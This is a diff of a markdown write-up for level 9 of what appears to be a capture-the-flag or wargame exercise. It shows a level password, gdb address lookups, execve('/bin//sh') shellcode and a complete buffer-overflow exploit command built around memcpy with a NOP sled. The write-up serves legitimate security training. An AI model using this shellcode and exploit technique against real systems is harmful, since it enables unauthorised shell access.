@@ -1,15 +1,18 @@
 # Level 9
 *password : c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a*
 
+## Analyze
+
 ```
 $ scp -P 4242 level9@192.168.56.108:level9 binary/
 ```
 0x6c = 108
 
-shellcode : 
-```
-\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
-```
+## Buffer overflow : memcpy exploit
+
+- use memcpy to launch our shellcode
+  - `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`
+- get some addresses
 ```
 (gdb) disas main
 ...
@@ -23,9 +26,9 @@ Breakpoint 1 at 0x804867c
 (gdb) x/x $eax
 0x804a00c
 ```
-buffer address : 0x804a00c\
-address buffer + 4 : 0x804a010\
-NOP-sled length : 108 - 25 - 4 = 79
+address `buffer` : 0x804a00c\
+address `buffer + 4` : 0x804a010\
+- compute NOP-sled length : 108 - 25 - 4 = 79
 
 ```
 $ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x90" * 79 +  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x0c\xa0\x04\x08"')
